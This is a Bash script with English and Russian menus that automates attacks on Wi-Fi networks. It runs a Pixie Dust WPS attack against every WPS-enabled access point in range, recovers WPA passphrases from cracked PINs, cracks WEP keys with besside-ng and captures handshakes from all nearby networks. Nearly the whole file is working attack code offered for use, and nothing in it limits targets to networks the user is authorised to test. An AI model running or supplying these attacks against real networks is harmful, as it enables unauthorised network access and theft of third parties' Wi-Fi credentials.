#!/bin/bash

IFACE=""
REPLY=""


if [ -e "cracked.txt" ]; then
	echo ""
else
	echo "" > cracked.txt
fi

if [ -e "blacklist.txt" ]; then
	echo ""
else
	echo "" > blacklist.txt
fi


if [[ "$(locale | grep LANG | grep -o ru)" == "ru" ]]; then
	LANGUAGE="Russian"
else
	LANGUAGE="English"
fi

declare -A Strings1
Strings1["English"]="\033[1mThere is no wireless interface on your system. Exit.\e[0m"
Strings1["Russian"]="\033[1mБеспроводные сетевые интерфейсы отсутствуют. Выход из программы.\e[0m"

declare -A Strings2
Strings2["English"]="\033[1mThere is one wireless interface on your system. Automatically Selected\e[0m"
Strings2["Russian"]="\033[1mНайден один беспроводной интерфейс - выбран автоматически\e[0m"

declare -A Strings3
Strings3["English"]="Available wireless interfaces: "
Strings3["Russian"]="Доступные беспроводные интерфейсы: "

declare -A Strings4
Strings4["English"]="Enter the number corresponding to the selected interface: "
Strings4["Russian"]="Введите цифру, соответствующую выбранному интерфейсу: "

declare -A Strings5
Strings5["English"]="Error. There is no selected wireless interface. Start from the interface selection"
Strings5["Russian"]="Ошибка: беспроводной сетевой интерфейс ещё не выбран. Начните с выбора беспроводного интерфейса"

declare -A Strings6
Strings6["English"]="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."
Strings6["Russian"]="Проверка возможного решения проблемы \"bad FCS (контроля последовательности кадров)\" если она существует. Параметризация..."

declare -A Strings7
Strings7["English"]="\033[1mLooking for Wi-Fi networks with WPS enabled\e[0m"
Strings7["Russian"]="\033[1mПоиск Wi-Fi сетей с WPS\e[0m"

declare -A Strings8
Strings8["English"]="\033[1mAutomatic attack Pixie Dust against every WPS enabled Wi-Fi network\e[0m"
Strings8["Russian"]="\033[1mАвтоматическая атака Pixie Dust на все Wi-Fi сети с WPS\e[0m"

declare -A Strings9
Strings9["English"]="Enter the aim number: "
Strings9["Russian"]="Введите номер цели: "

declare -A Strings10
Strings10["English"]="You selected: "
Strings10["Russian"]="Вы выбрали: "

declare -A Strings11
Strings11["English"]="Starting the attack: "
Strings11["Russian"]="Запускаем атаку: "

declare -A Strings12
Strings12["English"]="Processing "
Strings12["Russian"]="Работаем с "

declare -A Strings13
Strings13["English"]="\033[0;31mPIN is found, trying WAP passphrase. Пин: \e[0m"
Strings13["Russian"]="\033[0;31mПин найден, получаем пароль от Wi-Fi. Пин: \e[0m"

declare -A Strings14
Strings14["English"]="Discovered WPS enabled Wi-Fi networks:"
Strings14["Russian"]="Найдены сети с WPS:"

declare -A Strings15
Strings15["English"]="Fail."
Strings15["Russian"]="Неудача."

declare -A Strings16
Strings16["English"]="\033[0;31mWPS enabled Wi-Fi networks are not found\e[0m"
Strings16["Russian"]="\033[0;31mСети с WPS не найдены\e[0m"

declare -A Strings17
Strings17["English"]="\033[1mLooking for Open Wi-Fi networks\e[0m"
Strings17["Russian"]="\033[1mПоиск Wi-Fi сетей не защищённых паролем\e[0m"

declare -A Strings18
Strings18["English"]="\033[0;32mDiscovered Open Wi-Fi networks:\e[0m"
Strings18["Russian"]="\033[0;32mНайдены следующие открытые сети:\e[0m"

declare -A Strings19
Strings19["English"]="\033[0;31mOpen Wi-Fi networks are not found\e[0m"
Strings19["Russian"]="\033[0;31mОткрытых Wi-Fi сетей не найдено\e[0m"

declare -A Strings20
Strings20["English"]="\033[1mLooking for Wi-Fi networks with WEP encryption\e[0m"
Strings20["Russian"]="\033[1mПоиск Wi-Fi сетей с WEP шифрованием\e[0m"

declare -A Strings21
Strings21["English"]="Discovered Wi-Fi networks with WEP encryption:"
Strings21["Russian"]="Найдены следующие сети с WEP:"

declare -A Strings22
Strings22["English"]="\033[0;32mCracked Wi-Fi networks with WEP: \e[0m"
Strings22["Russian"]="\033[0;32mВзломана сеть с WEP: \e[0m"

declare -A Strings23
Strings23["English"]="\033[0;32mKey: \e[0m"
Strings23["Russian"]="\033[0;32mКлюч: \e[0m"

declare -A Strings24
Strings24["English"]="\033[0;31mWi-Fi networks with WEP encryption are not found\e[0m"
Strings24["Russian"]="\033[0;31mWi-Fi сетей с WEP не найдено\e[0m"

declare -A Strings25
Strings25["English"]="\033[1mCollecting handshakes from every Wi-Fi network in range\e[0m"
Strings25["Russian"]="\033[1mСбор хенщшейков со всех Wi-Fi сетей\e[0m"

declare -A Strings26
Strings26["English"]="Analyze collected handshakes:"
Strings26["Russian"]="Анализ собранных хендшейков:"

declare -A Strings27
Strings27["English"]="Selected wireless interface "
Strings27["Russian"]="Выбран беспроводной интерфейс "

declare -A Strings28
Strings28["English"]=". Mode: "
Strings28["Russian"]=". В режиме: "

declare -A Strings29
Strings29["English"]="Wireless interface still is not selected"
Strings29["Russian"]="Беспроводной сетевой интерфейс ещё не выбран"

declare -A Strings30
Strings30["English"]="Enter the number corresponding to the selected menu item: "
Strings30["Russian"]="Введите цифру, соответствующую выбранному пункту меню: "

declare -A Strings31
Strings31["English"]="The script is over."
Strings31["Russian"]="Программа завершена."

declare -A Strings32
Strings32["English"]="If you cracked WPS PIN, you are able to obtain WPA password. Connection to the target AP is necessary. Select the target AP and enter the WPS PIN."
Strings32["Russian"]="Если вам известен WPS ПИН, то вы можете получить WPA пароль. Для этого необходимо подключиться к целевой ТД. Сейчас будут показаны доступные ТД, выберите желаемую, а затем введите известный ПИН."

declare -A Strings33
Strings33["English"]="Enter WPS ПИН: "
Strings33["Russian"]="Введите WPS ПИН: "

declare -A Strings34
Strings34["English"]="Wait for 1 minite."
Strings34["Russian"]="Подождите 1 минуту."

declare -A Strings35
Strings35["English"]="The password is found: "
Strings35["Russian"]="Найден пароль: "

declare -A Strings36
Strings36["English"]="The password is not found. It is worth trying again."
Strings36["Russian"]="Пароль не найден. Завершение работы. Рекомендуется попробовать ещё несколько раз."

declare -A Strings37
Strings37["English"]="WPS of this network is disabled or the network is included in Blacklist or in Cracked List. Skipping."
Strings37["Russian"]="WPS для этой сети заблокирован, либо она присутствует в списке взломанных или в списке исключений. Пропускаем."


function selectInterface {
	clear
	COUNTER=0

	while read -r line ; do
		DEVS[$COUNTER]=$line
		COUNTER=$((COUNTER+1))
	done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")


	if [[ ${#DEVS[@]} == 0 ]]; then
		echo -e ${Strings1[$LANGUAGE]}
		exit		
	fi

	if [[ ${#DEVS[@]} == 1 ]]; then
		echo -e ${Strings2[$LANGUAGE]}
		IFACE=${DEVS[0]}
	fi

	if [[ ${#DEVS[@]} -gt 1 ]]; then
		COUNTER=0
		echo ${Strings3[$LANGUAGE]}
		for i in "${DEVS[@]}";
		do
			echo "$((COUNTER+1)). ${DEVS[COUNTER]}"
			COUNTER=$((COUNTER+1))
		done
		read -p "${Strings4[$LANGUAGE]}" INTNUM	
		IFACE=${DEVS[$((INTNUM-1))]}		
	fi

	if [ $REPLY -eq 11 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
		REPLY=""
		showMainMenu	
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}


function putInManagedMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
		sudo systemctl start NetworkManager
		REPLY=""
		showMainMenu	
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorModePlus {
	if [[ "$IFACE" ]]; then
		clear
		sudo systemctl stop NetworkManager
		sudo airmon-ng check kill
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi	
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

#Perform a test to determine if fcs parameter is needed on wash scanning #from airgeddon
function set_wash_parametrization {

	fcs=""
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "$IFACE" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs="-C"
			break
		fi
	done
}

function showWPSNetworks {
	echo ${Strings6[$LANGUAGE]}

	set_wash_parametrization

	echo -e ${Strings7[$LANGUAGE]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
		read -p "${Strings9[$LANGUAGE]}" AIM
		echo ${Strings10[$LANGUAGE]}
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
		echo ${Strings11[$LANGUAGE]}
		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"

	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi

	if [ $REPLY -eq 11 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function PixieDustAattack {

	echo ${Strings6[$LANGUAGE]}

	set_wash_parametrization

	echo -e ${Strings8[$LANGUAGE]}
	if [[ "$IFACE" ]]; then
		sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
		if [[ "$FOUNDWPS" ]]; then
			echo ${Strings14[$LANGUAGE]}
			echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
			echo '---------------------------------------------------------------------------------------------------------------'
			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

			COUNTER=0

			while read -r line ; do
				WPSS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')

			for i in "${WPSS[@]}"; 
			do
				echo ""
				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
				echo ${Strings12[$LANGUAGE]}"$i ($ESSID)";
				echo ${Strings11[$LANGUAGE]}
				isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
				if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
					echo -e ${Strings37[$LANGUAGE]}
				else
					sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
		
					sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
					sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"

					PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')

					if [[ "$PIN" ]]; then
						echo -e ${Strings13[$LANGUAGE]}"$PIN"
						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
						echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
						sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
						sleep 3
						echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$i" | awk '{print $1}') $PIN" | sudo wpa_cli

						echo -e ${Strings34[$LANGUAGE]}
						sleep 60		
						if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
							echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
						else 
							echo -e ${Strings36[$LANGUAGE]}
						fi

						rm /tmp/suppl.conf
						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up

						#sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
						#sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"

						#cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin:"
						#cat /tmp/reaver.wpa | grep -E "WPA"
						#rm /tmp/reaver.wpa

					else
						echo ${Strings15[$LANGUAGE]}
					fi					
				fi
			done
		else
			echo -e ${Strings16[$LANGUAGE]}
		fi

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

function showOpen {
	if [[ "$IFACE" ]]; then
		echo -e ${Strings17[$LANGUAGE]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
		if [[ "$NOPASS" ]]; then
			echo -e ${Strings18[$LANGUAGE]}
			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk '{print $19}'| sed 's/,//' | cat -b
		else
			echo -e ${Strings19[$LANGUAGE]}	
		fi

		sudo rm /tmp/openwifinetworks*

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

function attackWEP {
	if [[ "$IFACE" ]]; then
		echo -e ${Strings20[$LANGUAGE]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
		WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
		if [[ "$WEP" ]]; then
			echo ${Strings21[$LANGUAGE]}
			cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $19}' | sed 's/,//' | cat -b

			COUNTER=0

			while read -r line ; do
				WEPS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $1}' | sed 's/,//')

			for i in "${WEPS[@]}"; 
			do 
				echo ${Strings12[$LANGUAGE]}"$i";
				#sudo iw dev "$IFACE" set channel `cat /tmp/wepwifinetworks-01.csv | grep -E "$i" | awk '{print $6}' | sed 's/,//'`
				cd /tmp
				sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
				WEPCracked=$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}')
				if [[ "$WEPCracked" ]]; then
					echo -e ${Strings22[$LANGUAGE]}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
					echo -e ${Strings23[$LANGUAGE]}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
					rm /tmp/besside.log
					rm /tmp/wpa.cap
					rm /tmp/wep.cap
				else
					echo ${Strings15[$LANGUAGE]}
				fi
				cd
			done
		else
			echo -e ${Strings24[$LANGUAGE]}
		fi

		sudo rm /tmp/wepwifinetworks*

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

function getAllHandshakes {
	if [[ "$IFACE" ]]; then
		echo -e ${Strings25[$LANGUAGE]}

		sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $IFACE -f 30000 -w autopwner --berlin 1200" &
		sudo timeout 1200 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo zizzania -i $IFACE"
		
		echo ${Strings26[$LANGUAGE]}
		sleep 1
		sudo pyrit -r "$(ls | grep -E autopwn | grep -E cap | tail -n 1)" analyze


		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

function showWPAPassFromPin {

	echo ${Strings32[$LANGUAGE]}

	echo ${Strings6[$LANGUAGE]}

	set_wash_parametrization

	echo -e ${Strings7[$LANGUAGE]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up

		read -p "${Strings9[$LANGUAGE]}" AIM
		read -p "${Strings33[$LANGUAGE]}" PIN
		echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
		sleep 3
		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli

		echo -e ${Strings34[$LANGUAGE]}
		sleep 60		
		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
			echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
		else 
			echo -e ${Strings36[$LANGUAGE]}
		fi

		rm /tmp/suppl.conf
		exit
		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Strings5[$LANGUAGE]}
		REPLY=""
		showMainMenu
	fi
}

clear
COUNTER=0

while read -r line ; do
	DEVS[$COUNTER]=$line
	COUNTER=$((COUNTER+1))
done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")

if [[ ${#DEVS[@]} == 1 ]]; then
	echo -e ${Strings2[$LANGUAGE]}
	IFACE=${DEVS[0]}
fi


function showMainMenu {

if [[ "$IFACE" ]]; then
	INF=${Strings27[$LANGUAGE]}$IFACE

	while read -r line ; do
	INF=${INF}${Strings28[$LANGUAGE]}${line}
	done < <(sudo iw dev | grep -E -A5 "Interface $IFACE" | grep -E "type " | sed "s/		type //")	
else
	INF=${Strings29[$LANGUAGE]}
fi


if [[ "$LANGUAGE" == "Russian" ]]; then

cat << _EOF_
Информация:
$INF

Меню:
Выберите желаемое действие:
1. Выбрать беспроводной сетевой интерфейс
2. Перевести интерфейс в режим монитора
3. Перевести интерфейс в режим монитора + убить все мешающие ему процессы + завершить NetworkManager
4. Показать открытые Wi-Fi сети
5. Атака на WEP
6. Атака на WPS
7. Атака Pixie Dust (на все ТД с WPS)
8. Получение WPA-PSK пароля при известном WPS PIN
9. Атака на WPA2/WPA
10. Онлайн атака на WPA-PSK пароль (ещё не реализована)
11. Автоматический аудит Wi-Fi сетей

12. Перевести интерфейс в управляемый режим

0. Для выхода из программы
_EOF_



else

cat << _EOF_
Information:
$INF

Menu:
Actions:
1. Select an interface to work with
2. Put the interface in monitor mode
3. Put the interface in monitor mode + kill processes hindering it + kill NetworkManager
4. Show Open Wi-Fi networks
5. WEP Attack
6. WPS Attack
7. Pixie Dust Attack (against every APs with WPS)
8. Reveal WPA-PSK password from known WPS PIN
9. WPA2/WPA Attack
10. Online brut-force WPA password (not ready)
11. Run all but WPS Attack

12. Put interface in managed mode

0. Exit
_EOF_

fi

read -p "${Strings30[$LANGUAGE]}" REPLY


if [[ $REPLY =~ ^[0-9]$ ]]; then
	if [[ $REPLY == 0 ]]; then
		echo ${Strings31[$LANGUAGE]}
		exit
	fi
fi

if [[ $REPLY == 1 ]]; then
	selectInterface
fi

if [[ $REPLY == 2 ]]; then
	putInMonitorMode
fi

if [[ $REPLY == 3 ]]; then
	putInMonitorModePlus
fi

if [[ $REPLY == 4 ]]; then
	showOpen
fi

if [[ $REPLY == 5 ]]; then
	attackWEP
fi

if [[ $REPLY == 6 ]]; then
	showWPSNetworks
fi

if [[ $REPLY == 7 ]]; then
	PixieDustAattack
fi

if [[ $REPLY == 8 ]]; then
	showWPAPassFromPin
fi

if [[ $REPLY == 9 ]]; then
	getAllHandshakes
fi

if [[ $REPLY == 11 ]]; then
	putInMonitorModePlus
	showOpen
	attackWEP
	PixieDustAattack
	getAllHandshakes
fi

if [[ $REPLY == 12 ]]; then
	putInManagedMode
fi

}


showMainMenu
